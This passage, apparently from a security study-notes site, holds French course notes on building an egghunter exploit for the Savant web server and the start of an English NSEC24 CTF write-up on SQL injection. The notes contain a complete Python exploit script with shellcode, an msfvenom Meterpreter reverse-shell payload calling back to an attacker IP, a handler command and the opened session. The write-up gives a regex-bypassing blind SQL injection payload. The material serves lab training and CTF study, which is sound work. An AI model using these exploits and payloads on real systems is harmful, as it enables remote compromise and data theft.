<code>NtAccessCheckAndAuditAlarm</code> \u00e9tait <code>0x02</code>, ce n'est plus le cas ensuite. \u00c0 partir de Windows 10, il change \u00e0 chaque mise \u00e0 jour.</p> <p>On identifie le nouveau num\u00e9ro d'appel syst\u00e8me qui est <code>1C6h</code>.</p> <pre><code>ntdll!NtAccessCheckAndAuditAlarm:\n77840ec0 b8c6010000      mov     eax,1C6h                                               # ICI\n77840ec5 e803000000      call    ntdll!NtAccessCheckAndAuditAlarm+0xd (77840ecd)\n77840eca c22c00          ret     2Ch\n77840ecd 8bd4            mov     edx,esp\n</code></pre> <p>On met \u00e0 jour notre script <code>Python</code> pour g\u00e9n\u00e9rer les opcodes du egghunter :</p> <pre><code>#\n\"  push 0x1c6    ;\" \n#\n\"  pop eax    ;\" \n#\n\"  int 0x2e   ;\"\n</code></pre> <p>G\u00e9n\u00e9ration des opcodes \u00e0 la suite de la mise \u00e0 jour du num\u00e9ro d'appel syst\u00e8me :</p> <pre><code>$ python3 egghunter.py             \negghunter = (\"\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x68\\xc6\\x01\\x00\\x00\\x58\\xcd\\x2e\\x3c\\x05\\x5a\\x74\\xec\\xb8\\x77\\x30\\x30\\x74\\x89\\xd7\\xaf\\x75\\xe7\\xaf\\x75\\xe4\\xff\\xe7\")\n</code></pre> <p>On obtient des null bytes : <code>\\x00\\x00\\</code> en passant de <code>push 0x2</code> a <code>push 0x1c6</code>. Probl\u00e9matique, car les null bytes sont des mauvais caract\u00e8res.</p> <p>On va utiliser l'instruction <code>NEC</code> qui est l'equivalent d'une soustraction sur <code>0</code>. On doit trouver un nombre qui soustrait a <code>0</code> va donner <code>1c6</code>.</p> <p>On fait les op\u00e9rations dans WinDBG :</p> <pre><code>0:004&gt; ? 0x00 - 0x1C6\nEvaluate expression: -454 = fffffe3a\n0:004&gt; ? 0x00 - 0xfffffe3a\nEvaluate expression: -4294966842 = ffffffff`000001c6\n</code></pre> <p>On met \u00e0 jour le code <code>Python</code> qui g\u00e9n\u00e8re les opcodes du egghunter pour l'adapter</p> <pre><code>\" loop_check:     \"\n  # Save the edx register which holds our memory \n  # address on the stack\n\"  push edx   ;\"\n  # Push the negative number value of the system call number\n\"  mov eax 0xfffffe3a   ;\" \n  # Initialize the call to NtAccessCheckAndAuditAlarm\n\"  neg eax                              ;\"\n  # Perform the system call\n\"  int 0x2e   ;\" \n</code></pre> <p>On g\u00e9n\u00e8re de nouveau les opcodes suite a la mis \u00e0 jour :</p> <pre><code>$ python3 egghunter_v2.py\negghunter = (\"\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\xb8\\x3a\\xfe\\xff\\xff\\xf7\\xd8\\xcd\\x2e\\x3c\\x05\\x5a\\x74\\xeb\\xb8\\x77\\x30\\x30\\x74\\x89\\xd7\\xaf\\x75\\xe6\\xaf\\x75\\xe3\\xff\\xe7\")\n</code></pre> <p>On positionne un point d'arr\u00eat sur l'adresse ou se trouve l'instruction <code>POP EAX;RET</code> :</p> <pre><code>0:010&gt; bp 0x418674\n*** WARNING: Unable to verify checksum for C:\\Savant\\Savant.exe\n#\n#\n0:010&gt; g\nBreakpoint 0 hit\neax=00000000 ebx=018f5778 ecx=0000000e edx=77841670 esi=018f5778 edi=0041703c\neip=00418674 esp=0477ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206\nSavant+0x18674:\n00418674 58              pop     eax\n#\n#\n0:005&gt; ph\neax=0477fe70 ebx=018f5778 ecx=0000000e edx=77841670 esi=018f5778 edi=0041703c\neip=00418675 esp=0477ea30 ebp=41414141 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206\nSavant+0x18675:\n00418675 c3              ret\n#\n#\n0:005&gt; ph\neax=0477fe70 ebx=018f5778 ecx=00000000 edx=77841670 esi=018f5778 edi=0041703c\neip=0477ea88 esp=0477ea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\n0477ea88 0f8411000000    je      0477ea9f                                [br=1]\n#\n# On d\u00e9compile les opcodes a l'adresse `0460ea9f`. On retrouve bien les NOP + le code ASM pour le egghunter\n0:005&gt; u 0477ea9f L16\n0477ea9f 90              nop\n0477eaa0 90              nop\n0477eaa1 90              nop\n0477eaa2 90              nop\n0477eaa3 90              nop\n0477eaa4 90              nop\n0477eaa5 6681caff0f      or      dx,0FFFh\n0477eaaa 42              inc     edx\n0477eaab 52              push    edx\n0477eaac b83afeffff      mov     eax,0FFFFFE3Ah\n0477eab1 f7d8            neg     eax\n0477eab3 cd2e            int     2Eh\n0477eab5 3c05            cmp     al,5\n0477eab7 5a              pop     edx\n0477eab8 74eb            je      0477eaa5\n0477eaba b877303074      mov     eax,offset msvcp_win!_CTA2?AVbad_exceptionstd+0x13cab (74303077)\n0477eabf 89d7            mov     edi,edx\n0477eac1 af              scas    dword ptr es:[edi]\n0477eac2 75e6            jne     0477eaaa\n0477eac4 af              scas    dword ptr es:[edi]\n0477eac5 75e3            jne     0477eaaa\n0477eac7 ffe7            jmp     edi\n#\n# On met un point d'arr\u00eat sur l'adresse ou le `jmp edi` est r\u00e9alis\u00e9\n0:005&gt; bp 0477eac7\n#\n#\n0:005&gt; g\n</code></pre> <p>Le second point d'arr\u00eat est atteint. On est bien sur <code>jmp edi</code>. On affiche le contenu de <code>edi</code>, et on est bien sur le egg <code>w00tw00t</code> suivis du shellcode de <code>44444444</code> :</p> <pre><code>Breakpoint 1 hit\neax=74303077 ebx=018f5778 ecx=0477ea30 edx=018f5b2e esi=018f5778 edi=018f5b36\neip=0477eac7 esp=0477ea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\n0477eac7 ffe7            jmp     edi {018f5b36}\n0:005&gt; dc @edi - 0x08\n018f5b2e  74303077 74303077 44444444 44444444  w00tw00tDDDDDDDD\n018f5b3e  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD\n[...]\n</code></pre> <p>Probl\u00e9matique r\u00e9currente durant le d\u00e9veloppement d'exploit : trouver le compromis entre portabilit\u00e9 et taille d'exploit.</p>"},{"location":"binary-exploitation/3-egghunters/#recuperer-un-shell","title":"R\u00e9cup\u00e9rer un shell","text":"<p>Maintenant que le egghunter fonctionne, on peut mettre en oeuvre notre shellcode.</p> <p>Il faut se rappeler que le second buffer est dans une page m\u00e9moire diff\u00e9rente allou\u00e9e par le tas (heap). On ne connait pas les bad char de cette page m\u00e9moire et on a vu pr\u00e9c\u00e9demment que les mauvais caract\u00e8res ne sont pas universels a une application.</p> <p>On met \u00e0 jour la preuve de concept avec les tous les caract\u00e8res hexad\u00e9cimal en les positionnant dans le second buffer :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 80\n  size = 253\n\n  httpMethod = b\"\\x31\\xC9\\x85\\xC9\\x0F\\x84\\x11\" + b\" /\"  # xor ecx, ecx; test ecx, ecx; je 0x17 \n\n  egghunter = (b\"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" # NOP sled\n             b\"\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\xb8\"\n             b\"\\x3a\\xfe\\xff\\xff\\xf7\\xd8\\xcd\\x2e\"\n             b\"\\x3c\\x05\\x5a\\x74\\xeb\\xb8\\x77\\x30\"\n             b\"\\x30\\x74\\x89\\xd7\\xaf\\x75\\xe6\\xaf\"\n             b\"\\x75\\xe3\\xff\\xe7\")\n\n  inputBuffer = b\"\\x41\" * (size - len(egghunter))\n  inputBuffer+= pack(\"&lt;L\", (0x418674))                  # 0x00418674 - pop eax; ret\n  httpEndRequest = b\"\\r\\n\\r\\n\"\n\n  badchars = (\n    b\"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\"\n    b\"\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\"\n    b\"\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\"\n    b\"\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\"\n    b\"\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\n    b\"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\"\n    b\"\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\"\n    b\"\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\"\n    b\"\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\"\n    b\"\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\"\n    b\"\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\"\n    b\"\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\"\n    b\"\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\"\n    b\"\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\"\n    b\"\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\"\n    b\"\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\"\n    b\"\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\"\n    b\"\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\"\n    b\"\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\"\n    b\"\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\") \n\n  shellcode = b\"w00tw00t\" + badchars  +  b\"\\x44\" * (400 - len(badchars))\n\n  buf = httpMethod + egghunter + inputBuffer +  httpEndRequest + shellcode\n\n  print(\"Sending buffer\")\n  [...]\n</code></pre> <p>On positionne le point d'arr\u00eat sur <code>POP EAX</code> et on relance l'ex\u00e9cution :</p> <pre><code>#\n0:009&gt; bp 0x418674\n*** WARNING: Unable to verify checksum for C:\\Savant\\Savant.exe\n0:009&gt; bl\n     0 d Enable Clear  00000000 e 1 0001 (0001)  0:****\n     1 e Disable Clear  00418674     0001 (0001)  0:**** Savant+0x18674\n0:009&gt; g\n</code></pre> <p>Puis on relance l'exploit :</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[/media/\u2026/os/exp-301-osed/cours/cours6]\n\u2514\u2500$ python3 egg_v11.py 192.168.234.10\nSending buffer\nDone!\n</code></pre> <p>Le point d'arr\u00eat est atteint. On cherche manuellement notre egg avec WinDBG. On le trouve \u00e0 l'adresse <code>001e5b2e</code> et on affiche son contenu :</p> <pre><code>Breakpoint 1 hit\neax=00000000 ebx=001e5778 ecx=0000000e edx=77841670 esi=001e5778 edi=0041703c\neip=00418674 esp=0455ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206\nSavant+0x18674:\n00418674 58              pop     eax\n#\n0:004&gt; s -a 0x0 L?80000000 w00tw00t\n001e5b2e  77 30 30 74 77 30 30 74-00 01 02 03 04 05 06 07  w00tw00t........\n#\n0:004&gt; db 001e5b2e L110\n001e5b2e  77 30 30 74 77 30 30 74-00 01 02 03 04 05 06 07  w00tw00t........\n001e5b3e  08 09 0a 0b 0c 0d 0e 0f-10 11 12 13 14 15 16 17  ................\n001e5b4e  18 19 1a 1b 1c 1d 1e 1f-20 21 22 23 24 25 26 27  ........ !\"#$%&amp;'\n001e5b5e  28 29 2a 2b 2c 2d 2e 2f-30 31 32 33 34 35 36 37  ()*+,-./01234567\n001e5b6e  38 39 3a 3b 3c 3d 3e 3f-40 41 42 43 44 45 46 47  89:;&lt;=&gt;?@ABCDEFG\n001e5b7e  48 49 4a 4b 4c 4d 4e 4f-50 51 52 53 54 55 56 57  HIJKLMNOPQRSTUVW\n001e5b8e  58 59 5a 5b 5c 5d 5e 5f-60 61 62 63 64 65 66 67  XYZ[\\]^_`abcdefg\n001e5b9e  68 69 6a 6b 6c 6d 6e 6f-70 71 72 73 74 75 76 77  hijklmnopqrstuvw\n001e5bae  78 79 7a 7b 7c 7d 7e 7f-80 81 82 83 84 85 86 87  xyz{|}~.........\n001e5bbe  88 89 8a 8b 8c 8d 8e 8f-90 91 92 93 94 95 96 97  ................\n001e5bce  98 99 9a 9b 9c 9d 9e 9f-a0 a1 a2 a3 a4 a5 a6 a7  ................\n001e5bde  a8 a9 aa ab ac ad ae af-b0 b1 b2 b3 b4 b5 b6 b7  ................\n001e5bee  b8 b9 ba bb bc bd be bf-c0 c1 c2 c3 c4 c5 c6 c7  ................\n001e5bfe  c8 c9 ca cb cc cd ce cf-d0 d1 d2 d3 d4 d5 d6 d7  ................\n001e5c0e  d8 d9 da db dc dd de df-e0 e1 e2 e3 e4 e5 e6 e7  ................\n001e5c1e  e8 e9 ea eb ec ed ee ef-f0 f1 f2 f3 f4 f5 f6 f7  ................\n001e5c2e  f8 f9 fa fb fc fd fe ff-44 44 44 44 44 44 44 44  ........DDDDDDDD\n</code></pre> <p>Aucun mauvais caract\u00e8re n'est pr\u00e9sent, pas m\u00eame <code>00</code>. On peut donc g\u00e9n\u00e9rer un shellcode reverse shell Meterpreter :</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[/media/\u2026/os/exp-301-osed/cours/cours6]\n\u2514\u2500$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.183 LPORT=443 -f python -v  payload\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 354 bytes\nFinal size of python file: 1926 bytes\npayload =  b\"\"\npayload += b\"\\xfc\\xe8\\x8f\\x00\\x00\\x00\\x60\\x31\\xd2\\x89\\xe5\"\npayload += b\"\\x64\\x8b\\x52\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\"\npayload += b\"\\x72\\x28\\x31\\xff\\x0f\\xb7\\x4a\\x26\\x31\\xc0\\xac\"\npayload += b\"\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\"\npayload += b\"\\x49\\x75\\xef\\x52\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x57\"\npayload += b\"\\x01\\xd0\\x8b\\x40\\x78\\x85\\xc0\\x74\\x4c\\x01\\xd0\"\npayload += b\"\\x8b\\x58\\x20\\x8b\\x48\\x18\\x50\\x01\\xd3\\x85\\xc9\"\npayload += b\"\\x74\\x3c\\x49\\x31\\xff\\x8b\\x34\\x8b\\x01\\xd6\\x31\"\npayload += b\"\\xc0\\xc1\\xcf\\x0d\\xac\\x01\\xc7\\x38\\xe0\\x75\\xf4\"\npayload += b\"\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe0\\x58\\x8b\\x58\"\npayload += b\"\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\"\npayload += b\"\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\"\npayload += b\"\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x58\\x5f\\x5a\\x8b\"\npayload += b\"\\x12\\xe9\\x80\\xff\\xff\\xff\\x5d\\x68\\x33\\x32\\x00\"\npayload += b\"\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\"\npayload += b\"\\x07\\x89\\xe8\\xff\\xd0\\xb8\\x90\\x01\\x00\\x00\\x29\"\npayload += b\"\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\"\npayload += b\"\\x0a\\x68\\xc0\\xa8\\x2d\\xb7\\x68\\x02\\x00\\x01\\xbb\"\npayload += b\"\\x89\\xe6\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\"\npayload += b\"\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x10\\x56\\x57\"\npayload += b\"\\x68\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\"\npayload += b\"\\xff\\x4e\\x08\\x75\\xec\\xe8\\x67\\x00\\x00\\x00\\x6a\"\npayload += b\"\\x00\\x6a\\x04\\x56\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\"\npayload += b\"\\xd5\\x83\\xf8\\x00\\x7e\\x36\\x8b\\x36\\x6a\\x40\\x68\"\npayload += b\"\\x00\\x10\\x00\\x00\\x56\\x6a\\x00\\x68\\x58\\xa4\\x53\"\npayload += b\"\\xe5\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\\x53\\x57\\x68\"\npayload += b\"\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\"\npayload += b\"\\x58\\x68\\x00\\x40\\x00\\x00\\x6a\\x00\\x50\\x68\\x0b\"\npayload += b\"\\x2f\\x0f\\x30\\xff\\xd5\\x57\\x68\\x75\\x6e\\x4d\\x61\"\npayload += b\"\\xff\\xd5\\x5e\\x5e\\xff\\x0c\\x24\\x0f\\x85\\x70\\xff\"\npayload += b\"\\xff\\xff\\xe9\\x9b\\xff\\xff\\xff\\x01\\xc3\\x29\\xc6\"\npayload += b\"\\x75\\xc1\\xc3\\xbb\\xf0\\xb5\\xa2\\x56\\x6a\\x00\\x53\"\npayload += b\"\\xff\\xd5\"\n</code></pre> <p>On met \u00e0 jour l'exploit avec le shellcode de Meterpreter :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 80\n  size = 253\n\n  httpMethod = b\"\\x31\\xC9\\x85\\xC9\\x0F\\x84\\x11\" + b\" /\"  # xor ecx, ecx; test ecx, ecx; je 0x17 \n\n  egghunter = (b\"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" # NOP sled\n             b\"\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\xb8\"\n             b\"\\x3a\\xfe\\xff\\xff\\xf7\\xd8\\xcd\\x2e\"\n             b\"\\x3c\\x05\\x5a\\x74\\xeb\\xb8\\x77\\x30\"\n             b\"\\x30\\x74\\x89\\xd7\\xaf\\x75\\xe6\\xaf\"\n             b\"\\x75\\xe3\\xff\\xe7\")\n\n  inputBuffer = b\"\\x41\" * (size - len(egghunter))\n  inputBuffer+= pack(\"&lt;L\", (0x418674))                  # 0x00418674 - pop eax; ret\n  httpEndRequest = b\"\\r\\n\\r\\n\"\n\n  payload =  b\"\"\n  payload += b\"\\xfc\\xe8\\x8f\\x00\\x00\\x00\\x60\\x31\\xd2\\x89\\xe5\"\n  payload += b\"\\x64\\x8b\\x52\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\"\n  payload += b\"\\x72\\x28\\x31\\xff\\x0f\\xb7\\x4a\\x26\\x31\\xc0\\xac\"\n  payload += b\"\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\"\n  payload += b\"\\x49\\x75\\xef\\x52\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x57\"\n  payload += b\"\\x01\\xd0\\x8b\\x40\\x78\\x85\\xc0\\x74\\x4c\\x01\\xd0\"\n  payload += b\"\\x8b\\x58\\x20\\x8b\\x48\\x18\\x50\\x01\\xd3\\x85\\xc9\"\n  payload += b\"\\x74\\x3c\\x49\\x31\\xff\\x8b\\x34\\x8b\\x01\\xd6\\x31\"\n  payload += b\"\\xc0\\xc1\\xcf\\x0d\\xac\\x01\\xc7\\x38\\xe0\\x75\\xf4\"\n  payload += b\"\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe0\\x58\\x8b\\x58\"\n  payload += b\"\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\"\n  payload += b\"\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\"\n  payload += b\"\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x58\\x5f\\x5a\\x8b\"\n  payload += b\"\\x12\\xe9\\x80\\xff\\xff\\xff\\x5d\\x68\\x33\\x32\\x00\"\n  payload += b\"\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\"\n  payload += b\"\\x07\\x89\\xe8\\xff\\xd0\\xb8\\x90\\x01\\x00\\x00\\x29\"\n  payload += b\"\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\"\n  payload += b\"\\x0a\\x68\\xc0\\xa8\\x2d\\xb7\\x68\\x02\\x00\\x01\\xbb\"\n  payload += b\"\\x89\\xe6\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\"\n  payload += b\"\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x10\\x56\\x57\"\n  payload += b\"\\x68\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\"\n  payload += b\"\\xff\\x4e\\x08\\x75\\xec\\xe8\\x67\\x00\\x00\\x00\\x6a\"\n  payload += b\"\\x00\\x6a\\x04\\x56\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\"\n  payload += b\"\\xd5\\x83\\xf8\\x00\\x7e\\x36\\x8b\\x36\\x6a\\x40\\x68\"\n  payload += b\"\\x00\\x10\\x00\\x00\\x56\\x6a\\x00\\x68\\x58\\xa4\\x53\"\n  payload += b\"\\xe5\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\\x53\\x57\\x68\"\n  payload += b\"\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\"\n  payload += b\"\\x58\\x68\\x00\\x40\\x00\\x00\\x6a\\x00\\x50\\x68\\x0b\"\n  payload += b\"\\x2f\\x0f\\x30\\xff\\xd5\\x57\\x68\\x75\\x6e\\x4d\\x61\"\n  payload += b\"\\xff\\xd5\\x5e\\x5e\\xff\\x0c\\x24\\x0f\\x85\\x70\\xff\"\n  payload += b\"\\xff\\xff\\xe9\\x9b\\xff\\xff\\xff\\x01\\xc3\\x29\\xc6\"\n  payload += b\"\\x75\\xc1\\xc3\\xbb\\xf0\\xb5\\xa2\\x56\\x6a\\x00\\x53\"\n  payload += b\"\\xff\\xd5\"\n\n  shellcode = b\"w00tw00t\" + payload +  b\"\\x44\" * (400 - len(payload))\n\n  buf = httpMethod + egghunter + inputBuffer +  httpEndRequest + shellcode\n\n  print(\"Sending buffer\")\n  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  s.connect((server, port))\n  s.send(buf)\n  s.close()\n\n  print(\"Done!\")\n\nexcept socket.error:\n  print(\"Could not connect!\")\n</code></pre> <p>On lance un handler Meterpreter :</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[/media/\u2026/os/exp-301-osed/cours/cours6]\n\u2514\u2500$ sudo msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.45.183; set LPORT 443; exploit\"\n[sudo] password for kali:\n[*] Using configured payload generic/shell_reverse_tcp\nPAYLOAD =&gt; windows/meterpreter/reverse_tcp\nLHOST =&gt; 192.168.45.183\nLPORT =&gt; 443\n[*] Started reverse TCP handler on 192.168.45.183:443\n</code></pre> <p>Puis on lance l'exploit mis \u00e0 jour :</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[/media/\u2026/os/exp-301-osed/cours/cours6]\n\u2514\u2500$ python3 egg_v12.py 192.168.234.10\nSending buffer\nDone!\n</code></pre> <p>Et on re\u00e7oit un reverse shell :</p> <pre><code>[*] Sending stage (175686 bytes) to 192.168.234.10\n[*] Meterpreter session 1 opened (192.168.45.183:443 -&gt; 192.168.234.10:53994) at 2024-07-26 17:21:38 -0400\n\nmeterpreter &gt; getuid\nServer username: CLIENT\\Offsec\n</code></pre>"},{"location":"binary-exploitation/3-egghunters/#ameliorer-la-portabilite-du-egghunter-en-utilisant-seh-tbd","title":"Am\u00e9liorer la portabilit\u00e9 du Egghunter en utilisant SEH [TbD]","text":"<p>Initialement, le code egghunter utilisait la fonction <code>NtAccessCheckAndAuditAlarm</code>, car le code de l'appel syst\u00e8me n'avait pas chang\u00e9 depuis Windows 8. On a d\u00fb \u00e9crire en dur le nouveau code de l'appel syst\u00e8me, impactant la portabilit\u00e9 de l'exploit, car il devient n\u00e9cessaire d'identifier la version de l'OS en amont.</p> <p>On veut trouver un moyen que \u00e7a fonctionne sur toutes les versions de Windows.</p> <p>L'id\u00e9e d'utiliser <code>NtAccessCheckAndAuditAlarm</code> permet de d\u00e9l\u00e9guer la prise en charge de l'access violation au syst\u00e8me d'exploitation. Cependant, nous pourrions le faire nous-m\u00eames.</p> <p>On va cr\u00e9er notre propre Structured Exception Handler pour g\u00e9rer l'acc\u00e8s \u00e0 des pages m\u00e9moires invalides. Le processus <code>SEH</code> n'a pas beaucoup chang\u00e9 par rapport aux anciennes versions de Windows. L'impact est que le code de egghunter passe de 35b a 60b.</p>"},{"location":"write-up/NSEC24_Photographic-Memory-System/","title":"NSEC24 : Photographic Memory System","text":""},{"location":"write-up/NSEC24_Photographic-Memory-System/#challenge","title":"Challenge","text":"<p>During the NSEC24 CTF I had the opportunity to solve the following challenge with the help of my colleagues Ashiahanim Ayassor and Charl-Alexandre Le Brun. I will detail all the steps of this challenge in this blog post.</p> <p>The following information was given during the CTF:</p> <p></p> <p>The first step was to follow the given URL http://photographic-memory.ctf:</p> <p></p>"},{"location":"write-up/NSEC24_Photographic-Memory-System/#username-enumeration","title":"Username enumeration","text":"<p>Our first shot was to test the authentication using default credentials like <code>admin:admin</code> which gave us the following message:</p> <p></p> <p>Using another couple of credentials <code>root:admin</code> gave us another message:</p> <p></p> <p>At that point it was clear that the application was vulnerable to username enumeration allowing us to know that the user <code>admin</code> exists in the application.</p>"},{"location":"write-up/NSEC24_Photographic-Memory-System/#sql-injections","title":"SQL injections","text":""},{"location":"write-up/NSEC24_Photographic-Memory-System/#regex","title":"Regex","text":"<p>After trying multiple password with the <code>admin</code> username, we tried various SQL injection on the <code>username</code> field leading us to get the following error message:</p> <p></p> <p>This error message let us know that there are restrictions on the username field that will limit us from performing SQL injections.</p>"},{"location":"write-up/NSEC24_Photographic-Memory-System/#sqlmap","title":"sqlmap","text":"<p>We were curious to see if <code>sqlmap</code> could allow us to grab some information despite the regex limitation so we ran it against the web portal and we got the following results:</p> <pre><code>$ sqlmap -r req --level 5 --risk 3 --all\n[...]\n---\nParameter: username (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: username=admin' AND 6339=6339 AND 'IvSQ'='IvSQ&amp;passwd=admin\n---\n[...]\n[14:06:04] [WARNING] reflective value(s) found and filtering out\nweb server operating system: Linux Ubuntu 22.04 (jammy)\nweb application technology: Apache 2.4.52\nback-end DBMS: Microsoft SQL Server 2022\n[...]\n[14:06:05] [INFO] fetching server hostname\n[14:06:05] [INFO] retrieved: ctn-mbergeron-photographic-memory\nhostname: 'ctn-mbergeron-photographic-memory'\n[14:06:14] [INFO] testing if current user is DBA\ncurrent user is DBA: False\n[...]\n[14:06:14] [CRITICAL] unable to retrieve the number of database users\n</code></pre> <p>The tool was able to find some details but nothing regarding the databases, the tables or the stored data.</p>"},{"location":"write-up/NSEC24_Photographic-Memory-System/#bypass-regex","title":"Bypass regex","text":"<p>Let's dig inside this regex to understand how to bypass it:</p> <pre><code>(alter|create|delete|drop|exec|execute|insert|merge|select|update|union|truncate)([^a-z\\]\\'%])|--|]]|\\/\\*|\\*\\/\n</code></pre> <ul> <li>The first group of regex is looking for the following key words : <code>alter|create|delete|drop|exec|execute|insert|merge|select|update|union|truncate</code></li> <li>The second group of regex is looking for character not present in the list <code>a-z</code> - <code>]</code> - <code>'</code> - <code>%</code></li> <li>If the payload contains <code>--</code> or <code>]]</code> we get blocked</li> <li>If the payload contains <code>*/</code> or <code>/*</code> we are also blocked</li> </ul> <p>Details using Regex101:</p> <p></p> <p>After the analysis of the regex we have been able to find an SQL request that would allow us to bypass the regex limitation while dumping the information regarding databases, the tables and stored data:</p> <pre><code>username=admin' AND SUBSTRING((CAST((SELECT'm'%2name FROM master..sysdatabases ORDER BY name OFFSET 0 ROWS FETCH FIRST 1 ROWS ONLY) AS NVARCHAR(4000))),1,1)='m' AND 'uNDi'='uNDi&amp;passwd=admin\n</code></pre> <p>To help us building our final payload we used codapi which allow us to check if our request was correct at a syntax level.</p> <p>Here is some explanation regarding our SQL request:</p> <ul> <li><code>SELECT'm'</code> : This syntax is authorized by MSSQL and allows us to use the 